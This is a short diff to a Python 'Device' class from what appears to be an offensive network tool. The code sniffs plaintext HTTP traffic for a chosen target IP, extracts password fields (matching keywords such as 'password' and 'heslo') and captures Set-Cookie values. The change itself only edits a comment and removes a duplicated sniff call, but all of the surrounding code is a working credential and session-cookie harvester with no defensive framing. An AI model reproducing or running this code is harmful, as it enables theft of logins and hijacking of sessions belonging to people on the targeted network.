@@ -86,7 +86,7 @@ class Device:
                                 if any(k in line.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
                                     password_data = urllib.parse.unquote(line.split('=')[1]).split('/')[0]  # Decode and handle special chars
 
-                                    # Handle special characters in password
+                                    # Handle special characters in password by using urllib's unquote to decode them
                                     if '&' in password_data:
                                         password_data = password_data.split('&')[0]  # Only take the first part if & is present
 
@@ -111,9 +111,6 @@ class Device:
                         cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
                         print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
     
-        sniff(iface=self.iface, prn=http_pkt_callback,
-              filter=f'tcp port 80 and host {self.targetip}', store=0)
-
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
